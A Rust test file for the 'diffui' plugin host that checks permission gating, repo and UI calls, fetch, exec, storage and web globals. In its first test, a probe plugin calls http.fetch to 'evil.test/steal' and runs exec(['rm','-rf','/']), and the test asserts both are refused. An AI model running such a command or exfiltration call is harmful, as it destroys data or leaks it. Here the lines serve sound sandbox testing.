//! The host functions a script calls: what the manifest lets through, what
//! reaches the app, and the web-style globals.

use std::time::{Duration, Instant};

use diffui_plugins::protocol::{
    Choice, DiffFormat, HostCall, RepoCall, RepoHandle, RepoRef, Tone, UiCall,
};
use diffui_plugins::{PluginError, PluginState};
use serde_json::{Value, json};

use crate::support::{CURRENT_OP, PATIENCE, Response, Server, case, probe, repo, threw};

#[test]
fn every_permission_is_refused_without_its_grant() {
    let plugin = probe(
        "[permissions]\nhttp = [\"allowed.test\"]\nexec = [[\"git\", \"credential\"]]\n",
        r#"
  http: () => http.fetch("https://evil.test/steal"),
  exec: () => exec(["rm", "-rf", "/"]),
  query: (repo) => repo.jj.query(["log"]),
  rows: (repo) => repo.rows("@"),
  run: (repo) => repo.jj.run(["abandon", "@"]),
  token: () => auth.token("github.com"),
  handle: (repo) => `${repo.root} ${repo.forgeRemote.host}`,
"#,
    )
    .spawn();
    plugin.loaded();
    for (name, message) in [
        (
            "http",
            "http.fetch to evil.test is not allowed: plugin.toml's [permissions] http must list the host, and it allows allowed.test",
        ),
        (
            "exec",
            "exec [\"rm\", \"-rf\", \"/\"] is not allowed: plugin.toml's [permissions] exec must list an argv prefix for it, and it allows [\"git\", \"credential\"]",
        ),
        (
            "query",
            "repo.jj.query is not allowed: it needs jj = \"read\" under [permissions] in plugin.toml",
        ),
        (
            "rows",
            "repo.rows is not allowed: it needs jj = \"read\" under [permissions] in plugin.toml",
        ),
        (
            "run",
            "repo.jj.run is not allowed: it needs jj = \"write\" under [permissions] in plugin.toml",
        ),
        (
            "token",
            "auth.token(\"github.com\") is not allowed: plugin.toml's [permissions] http must list the host",
        ),
    ] {
        let error = threw(plugin.case(name));
        assert_eq!(
            (error.name.as_str(), error.message.as_str()),
            ("PermissionError", message),
            "{name}"
        );
        // The refusal points at the plugin's own line, not at the host's.
        assert!(
            error
                .location()
                .is_some_and(|at| at.starts_with("main.js:")),
            "{name}: {}",
            error.stack
        );
    }
    // Nothing refused ever reached the app, and the handle's own fields need
    // no permission.
    assert!(plugin.host.calls.lock().unwrap().is_empty());
    assert_eq!(
        plugin.case("handle").unwrap(),
        json!("/work/app forge.test")
    );
}

#[test]
fn read_access_stops_short_of_jj_run() {
    let plugin = probe(
        "[permissions]\njj = \"read\"\n",
        "query: (repo) => repo.jj.query([\"log\", \"-r\", \"@\"]),\n  run: (repo) => repo.jj.run([\"abandon\", \"@\"]),",
    )
    .spawn();
    plugin.loaded();
    assert_eq!(plugin.case("query").unwrap(), json!("jj log -r @"));
    assert_eq!(threw(plugin.case("run")).name, "PermissionError");
}

#[test]
fn repo_calls_reach_the_app_with_the_handle_they_came_from() {
    let plugin = probe(
        "[permissions]\njj = \"write\"\n",
        r#"
  all: async (repo) => ({
    bookmarks: await repo.bookmarks(),
    remotes: await repo.remotes(),
    selection: await repo.selection(),
    rows: await repo.rows("trunk()..@", { limit: 5 }),
    defaults: [(await repo.rows("@"))[0].description, (await repo.diff("@")).text],
    diff: await repo.diff("@", { format: "stat", maxBytes: 4096 }),
    file: await repo.readFile("@", "README.md"),
    missing: await repo.readFile("@", "missing"),
    query: await repo.jj.query(["log", "-r", "@"]),
    run: await repo.jj.run(["describe", "-m", "hi"]),
  }),
  argv: (repo) => repo.jj.run("abandon @"),
  frozen: (repo) => { repo.root = "/elsewhere"; },
"#,
    )
    .spawn();
    plugin.loaded();
    let all = plugin.case("all").unwrap();
    assert_eq!(
        all["bookmarks"],
        json!([{ "name": "main", "targets": ["c0ffee"], "remotes": [] }])
    );
    assert_eq!(
        all["rows"][0]["description"],
        "rows of trunk()..@ (limit 5)"
    );
    assert_eq!(
        all["defaults"],
        json!(["rows of @ (limit 100)", "Git diff of @ up to 1048576"])
    );
    assert_eq!(all["rows"][0]["workingCopy"], true);
    assert_eq!(
        all["diff"],
        json!({ "text": "Stat diff of @ up to 4096", "truncated": false })
    );
    assert_eq!(all["file"], "README.md at @");
    assert_eq!(all["missing"], Value::Null);
    assert_eq!(all["query"], "jj log -r @");
    assert_eq!(all["run"], json!({ "summary": "Ran jj describe -m hi" }));

    let calls = plugin.host.calls.lock().unwrap().clone();
    let at = RepoRef {
        id: "tab-1".into(),
        op: CURRENT_OP.into(),
    };
    assert_eq!(calls.len(), 11);
    assert_eq!(
        calls[3],
        HostCall::Repo {
            repo: at.clone(),
            call: RepoCall::Rows {
                revset: "trunk()..@".into(),
                limit: 5
            }
        }
    );
    assert_eq!(
        calls[6],
        HostCall::Repo {
            repo: at.clone(),
            call: RepoCall::Diff {
                revset: "@".into(),
                format: DiffFormat::Stat,
                max_bytes: 4096
            }
        }
    );
    assert_eq!(
        calls[10],
        HostCall::Repo {
            repo: at,
            call: RepoCall::JjRun {
                args: vec!["describe".into(), "-m".into(), "hi".into()]
            }
        }
    );

    assert_eq!(
        threw(plugin.case("argv")).message,
        "repo.jj.run takes a non-empty array of strings, like [\"log\", \"-r\", \"@\"]"
    );
    assert_eq!(threw(plugin.case("frozen")).name, "TypeError");
}

#[test]
fn a_stale_handle_is_rejected_by_the_host() {
    let plugin = probe(
        "[permissions]\njj = \"read\"\n",
        "rows: (repo) => repo.rows(\"@\"),",
    )
    .spawn();
    plugin.loaded();
    let stale = RepoHandle {
        op: "op-before".into(),
        ..repo()
    };
    let error = threw(plugin.call(case("rows", stale)));
    assert_eq!(error.name, "StaleError");
    assert_eq!(
        error.message,
        "This repository handle is stale: the repository changed after it was made"
    );
    assert!(plugin.case("rows").is_ok());
}

#[test]
fn ui_calls_carry_their_arguments_and_replies() {
    let plugin = probe(
        "",
        r#"
  all: async () => {
    await ui.toast("Pushed");
    await ui.toast("Nope", { tone: "error" });
    const activity = await ui.activity("Syncing");
    await activity.append("one line");
    await activity.finish({ error: "it broke" });
    await ui.openUrl("https://forge.test/pr/1");
    await ui.clipboard.write("copied");
    await ui.status.set("3 open");
    await ui.status.set(null);
    return {
      input: await ui.prompt.input({ label: "Title", value: "draft" }),
      dismissed: await ui.prompt.input({ label: "Title" }),
      confirm: await ui.prompt.confirm({ title: "Close it?", destructive: true }),
      choose: await ui.prompt.choose({ label: "Base", choices: ["main", { label: "Develop", hint: "default", value: "develop" }] }),
    };
  },
"#,
    )
    .spawn();
    plugin.loaded();
    assert_eq!(
        plugin.case("all").unwrap(),
        json!({ "input": "draft!", "dismissed": null, "confirm": false, "choose": "develop" })
    );
    let calls = plugin.host.calls.lock().unwrap().clone();
    let ui = |index: usize| match &calls[index] {
        HostCall::Ui(call) => call.clone(),
        other => panic!("not a ui call: {other:?}"),
    };
    assert_eq!(
        ui(1),
        UiCall::Toast {
            message: "Nope".into(),
            tone: Tone::Error
        }
    );
    assert_eq!(
        ui(2),
        UiCall::ActivityStart {
            label: "Syncing".into()
        }
    );
    assert_eq!(
        ui(4),
        UiCall::ActivityFinish {
            activity: 7,
            error: Some("it broke".into())
        }
    );
    assert_eq!(ui(8), UiCall::StatusSet { text: None });
    assert_eq!(
        ui(12),
        UiCall::PromptChoose {
            label: "Base".into(),
            choices: vec![
                Choice {
                    label: "main".into(),
                    hint: None,
                    value: "main".into()
                },
                Choice {
                    label: "Develop".into(),
                    hint: Some("default".into()),
                    value: "develop".into()
                },
            ]
        }
    );
}

#[test]
fn a_request_the_app_drops_or_answers_late_settles_cleanly() {
    let plugin = probe("", "ask: () => ui.prompt.input({ label: \"hold\" }),").spawn();
    plugin.loaded();
    let take = || loop {
        if let Some(reply) = plugin.host.held.lock().unwrap().pop() {
            break reply;
        }
        std::thread::sleep(Duration::from_millis(5));
    };

    let dropped = plugin.start::<Value>(case("ask", repo()));
    drop(take());
    let error = threw(dropped.recv_timeout(PATIENCE).unwrap());
    assert_eq!(
        error.message,
        "diffui dropped the request without answering"
    );

    // A reply that arrives after a reload belongs to a script that is gone.
    let waiting = plugin.start::<Value>(case("ask", repo()));
    let late = take();
    plugin.plugin.reload();
    assert_eq!(
        waiting.recv_timeout(PATIENCE).unwrap().unwrap_err(),
        PluginError::Gone
    );
    plugin.loaded();
    assert!(late.is_cancelled());
    late.ok("too late");
    assert!(matches!(plugin.plugin.state(), PluginState::Ready(_)));
}

#[test]
fn fetch_talks_to_an_allowed_host() {
    let server = Server::start(|request| match request.path.as_str() {
        "/echo" => Response::json(
            201,
            json!({ "method": request.method, "body": request.body, "auth": request.header("authorization"), "kind": request.header("content-type") }),
        ),
        "/missing" => Response::text(404, "no such thing"),
        "/form" => Response::text(
            200,
            &format!(
                "{}|{}",
                request.header("content-type").unwrap_or(""),
                request.body
            ),
        ),
        "/hop" => Response {
            status: 302,
            headers: vec![("location", "/echo".into())],
            body: String::new(),
        },
        "/leave" => Response {
            status: 302,
            headers: vec![("location", "http://elsewhere.test/".into())],
            body: String::new(),
        },
        "/slow" => {
            std::thread::sleep(Duration::from_millis(1500));
            Response::text(200, "late")
        }
        _ => Response::text(500, "unexpected"),
    });
    let base = format!("http://{}", server.host);
    let plugin = probe(
        &format!("[permissions]\nhttp = [\"{}\"]\n", server.host),
        &format!(
            r#"
  post: async () => {{
    const res = await http.fetch("{base}/echo", {{
      method: "post",
      headers: {{ Authorization: "token s3cret", "Content-Type": "application/json" }},
      body: JSON.stringify({{ title: "héllo" }}),
    }});
    return {{ ok: res.ok, status: res.status, type: res.headers.get("Content-Type"), has: res.headers.has("x-nope"), json: await res.json(), url: res.url }};
  }},
  missing: async () => {{
    const res = await http.fetch(new URL("/missing", "{base}"));
    return {{ ok: res.ok, status: res.status, text: await res.text() }};
  }},
  form: async () => (await http.fetch("{base}/form", {{ method: "POST", body: new URLSearchParams({{ q: "a b", n: "1" }}) }})).text(),
  hop: async () => (await http.fetch("{base}/hop", {{ headers: {{ authorization: "token s3cret" }} }})).json(),
  leave: () => http.fetch("{base}/leave"),
  slow: () => http.fetch("{base}/slow", {{ timeoutMs: 100 }}),
  abort: async () => {{
    const controller = new AbortController();
    setTimeout(() => controller.abort(), 50);
    try {{ await http.fetch("{base}/slow", {{ signal: controller.signal }}); }} catch (error) {{ return error.name; }}
  }},
  aborted: () => http.fetch("{base}/echo", {{ signal: AbortSignal.abort() }}),
  object: () => http.fetch("{base}/echo", {{ method: "POST", body: {{ not: "text" }} }}),
"#
        ),
    )
    .spawn();
    plugin.loaded();

    let post = plugin.case("post").unwrap();
    assert_eq!(post["ok"], true);
    assert_eq!(post["status"], 201);
    assert_eq!(post["type"], "application/json");
    assert_eq!(post["has"], false);
    assert_eq!(post["url"], format!("{base}/echo"));
    assert_eq!(
        post["json"],
        json!({ "method": "POST", "body": "{\"title\":\"héllo\"}", "auth": "token s3cret", "kind": "application/json" })
    );

    assert_eq!(
        plugin.case("missing").unwrap(),
        json!({ "ok": false, "status": 404, "text": "no such thing" })
    );
    assert_eq!(
        plugin.case("form").unwrap(),
        json!("application/x-www-form-urlencoded;charset=UTF-8|q=a+b&n=1")
    );
    // A redirect on the same host is followed, token and all.
    assert_eq!(plugin.case("hop").unwrap()["auth"], "token s3cret");

    let leave = threw(plugin.case("leave"));
    assert_eq!(leave.name, "PermissionError");
    assert!(
        leave
            .message
            .starts_with("http.fetch to elsewhere.test is not allowed")
            && leave
                .message
                .ends_with(&format!("(redirected from {base}/leave)")),
        "{}",
        leave.message
    );
    assert_eq!(threw(plugin.case("slow")).name, "TimeoutError");
    assert_eq!(plugin.case("abort").unwrap(), json!("AbortError"));
    assert_eq!(threw(plugin.case("aborted")).name, "AbortError");
    assert!(
        threw(plugin.case("object"))
            .message
            .starts_with("http.fetch sends text bodies only")
    );
}

#[test]
fn exec_runs_an_allowed_argv() {
    let plugin = probe(
        "[permissions]\nexec = [[\"sh\", \"-c\"], [\"sleep\"]]\n",
        r#"
  run: async () => {
    const lines = [];
    const out = await exec(["sh", "-c", "cat; echo two; echo warn >&2; exit 4"], { stdin: "one\n", onStdout: (line) => lines.push(line) });
    return { ...out, lines };
  },
  cwd: async (repo) => (await exec(["sh", "-c", "pwd"], { cwd: "/usr" })).stdout.trim(),
  home: async () => (await exec(["sh", "-c", "ls plugin.toml"])).ok,
  abort: async () => {
    const started = Date.now();
    try { await exec(["sleep", "30"], { signal: AbortSignal.timeout(100) }); } catch (error) { return { name: error.name, quick: Date.now() - started < 5000 }; }
  },
  timeout: () => exec(["sleep", "30"], { timeoutMs: 100 }),
  missing: () => exec(["sh", "-c"].concat("x").slice(0, 0)),
"#,
    )
    .spawn();
    plugin.loaded();
    assert_eq!(
        plugin.case("run").unwrap(),
        json!({ "code": 4, "ok": false, "stdout": "one\ntwo\n", "stderr": "warn\n", "lines": ["one", "two"] })
    );
    assert_eq!(plugin.case("cwd").unwrap(), json!("/usr"));
    // Without a cwd it runs in the plugin's own directory.
    assert_eq!(plugin.case("home").unwrap(), json!(true));
    assert_eq!(
        plugin.case("abort").unwrap(),
        json!({ "name": "TimeoutError", "quick": true })
    );
    assert_eq!(threw(plugin.case("timeout")).name, "TimeoutError");
    assert!(
        threw(plugin.case("missing"))
            .message
            .starts_with("exec takes a non-empty array of strings")
    );
}

#[test]
fn a_token_comes_from_token_cmd_and_is_asked_for_once() {
    let plugin = probe(
        "[permissions]\nhttp = [\"forge.test\"]\n",
        "token: async () => [await auth.token(\"forge.test\"), await auth.token(\"forge.test\")],",
    )
    .config("token_cmd = [\"sh\", \"-c\", \"echo asked >> asked.log; echo tok-$0\", \"{host}\"]\n")
    .spawn();
    plugin.loaded();
    assert_eq!(
        plugin.case("token").unwrap(),
        json!(["tok-forge.test", "tok-forge.test"])
    );
    assert_eq!(
        std::fs::read_to_string(plugin.dir.join("asked.log")).unwrap(),
        "asked\n"
    );
}

#[test]
fn kv_and_config_persist_and_merge() {
    let plugin = probe(
        "[config.schema]\nhost = { type = \"string\", default = \"forge.test\" }\nlimit = { type = \"number\", default = 50 }\n",
        r#"
  config: () => config,
  write: async () => { await kv.set("seen", { pr: 41 }); await kv.set("gone", 1); await kv.delete("gone"); },
  read: async () => [await kv.get("seen"), (await kv.get("gone")) === undefined],
  frozen: () => { config.limit = 1; },
"#,
    )
    .config("limit = 5\nextra = \"kept\"\n")
    .spawn();
    plugin.loaded();
    assert_eq!(
        plugin.case("config").unwrap(),
        json!({ "host": "forge.test", "limit": 5, "extra": "kept" })
    );
    assert_eq!(threw(plugin.case("frozen")).name, "TypeError");
    plugin.case("write").unwrap();
    plugin.plugin.reload();
    plugin.loaded();
    assert_eq!(plugin.case("read").unwrap(), json!([{ "pr": 41 }, true]));
}

#[test]
fn console_lands_in_the_captured_log() {
    let plugin = probe(
        "",
        "log: () => { console.log(\"plain\", 1, { a: [true, null] }); console.warn(\"careful\"); console.error(new RangeError(\"bad range\")); console.debug(undefined, () => {}); },",
    )
    .spawn();
    plugin.loaded();
    plugin.case("log").unwrap();
    let log = plugin.log_text();
    assert!(log.contains("Info plain 1 {\"a\":[true,null]}\n"), "{log}");
    assert!(log.contains("Warn careful\n"), "{log}");
    assert!(
        log.contains("Error RangeError: bad range\n    at log (main.js:"),
        "{log}"
    );
    assert!(
        log.contains("Debug undefined [function anonymous]\n"),
        "{log}"
    );
}

#[test]
fn timers_fire_in_order_and_can_be_cleared() {
    let plugin = probe(
        "",
        r#"
  order: () => new Promise((resolve) => {
    const seen = [];
    setTimeout(() => seen.push("b"), 40);
    setTimeout((x, y) => seen.push(x + y), 10, "a", "!");
    const cancelled = setTimeout(() => seen.push("never"), 20);
    clearTimeout(cancelled);
    setTimeout(() => resolve(seen), 80);
  }),
"#,
    )
    .spawn();
    plugin.loaded();
    let started = Instant::now();
    assert_eq!(plugin.case("order").unwrap(), json!(["a!", "b"]));
    assert!(started.elapsed() >= Duration::from_millis(80));
}

#[test]
fn the_web_globals_behave() {
    let plugin = probe(
        "",
        r#"
  url: () => {
    const url = new URL("https://User:pw@Forge.Test:8443/api/v1/../v2/repos?state=open&limit=50#top");
    const params = url.searchParams;
    params.append("q", "a b&c");
    params.set("limit", "10");
    const relative = new URL("../pulls?x=1", "https://forge.test/api/v1/repos/");
    return {
      href: url.href, origin: url.origin, protocol: url.protocol, host: url.host, hostname: url.hostname, port: url.port,
      pathname: url.pathname, search: url.search, hash: url.hash, username: url.username, password: url.password,
      state: params.get("state"), missing: params.get("nope"), all: [...params].length, json: JSON.stringify({ url }),
      relative: relative.href, absolute: new URL("/x y", "http://h:80/a/b").href, defaultPort: new URL("https://h:443/").host,
      canParse: [URL.canParse("https://ok.test"), URL.canParse("nope"), URL.canParse("/x", "https://ok.test")],
      params: new URLSearchParams({ a: "1", b: "x y" }).toString(), parsed: new URLSearchParams("?a=1&a=2&b=%C3%A9+").getAll("a").concat(new URLSearchParams("b=%C3%A9+").get("b")),
    };
  },
  badUrl: () => new URL("not a url"),
  text: () => {
    const bytes = new TextEncoder().encode("héllo €");
    return {
      length: bytes.length, isBytes: bytes instanceof Uint8Array, round: new TextDecoder().decode(bytes),
      buffer: new TextDecoder("utf-8").decode(bytes.buffer), lossy: new TextDecoder().decode(new Uint8Array([104, 255, 105])),
    };
  },
  fatal: () => new TextDecoder("utf-8", { fatal: true }).decode(new Uint8Array([255])),
  latin: () => new TextDecoder("latin1"),
  abort: () => {
    const controller = new AbortController();
    const heard = [];
    controller.signal.addEventListener("abort", (event) => heard.push(event.type));
    controller.signal.onabort = () => heard.push("onabort");
    const before = controller.signal.aborted;
    controller.abort(new Error("stop"));
    controller.abort(new Error("again"));
    let thrown;
    try { controller.signal.throwIfAborted(); } catch (error) { thrown = error.message; }
    return { before, after: controller.signal.aborted, heard, reason: controller.signal.reason.message, thrown };
  },
  node: () => {
    const said = [];
    for (const attempt of [() => require("fs"), () => fetch("https://x.test")]) {
      try { attempt(); } catch (error) { said.push(error.message); }
    }
    return { said, process: typeof process, window: typeof window };
  },
"#,
    )
    .spawn();
    plugin.loaded();

    assert_eq!(
        plugin.case("url").unwrap(),
        json!({
            "href": "https://User:pw@forge.test:8443/api/v2/repos?state=open&limit=10&q=a+b%26c#top",
            "origin": "https://forge.test:8443", "protocol": "https:", "host": "forge.test:8443", "hostname": "forge.test", "port": "8443",
            "pathname": "/api/v2/repos", "search": "?state=open&limit=10&q=a+b%26c", "hash": "#top", "username": "User", "password": "pw",
            "state": "open", "missing": null, "all": 3,
            "json": "{\"url\":\"https://User:pw@forge.test:8443/api/v2/repos?state=open&limit=10&q=a+b%26c#top\"}",
            "relative": "https://forge.test/api/v1/pulls?x=1", "absolute": "http://h/x%20y", "defaultPort": "h",
            "canParse": [true, false, true],
            "params": "a=1&b=x+y", "parsed": ["1", "2", "é "],
        })
    );
    assert_eq!(
        threw(plugin.case("badUrl")).message,
        "Invalid URL: \"not a url\""
    );
    assert_eq!(
        plugin.case("text").unwrap(),
        json!({ "length": 10, "isBytes": true, "round": "héllo €", "buffer": "héllo €", "lossy": "h\u{fffd}i" })
    );
    assert_eq!(threw(plugin.case("fatal")).name, "TypeError");
    assert_eq!(
        threw(plugin.case("latin")).message,
        "TextDecoder only decodes utf-8, not \"latin1\""
    );
    assert_eq!(
        plugin.case("abort").unwrap(),
        json!({ "before": false, "after": true, "heard": ["onabort", "abort"], "reason": "stop", "thrown": "stop" })
    );
    assert_eq!(
        plugin.case("node").unwrap(),
        json!({
            "said": [
                "require(\"fs\") is not available: plugins are ES modules. Import from \"diffui\" or from a relative file.",
                "fetch is not a global here. Use `http.fetch` from \"diffui\".",
            ],
            "process": "undefined", "window": "undefined",
        })
    );
}
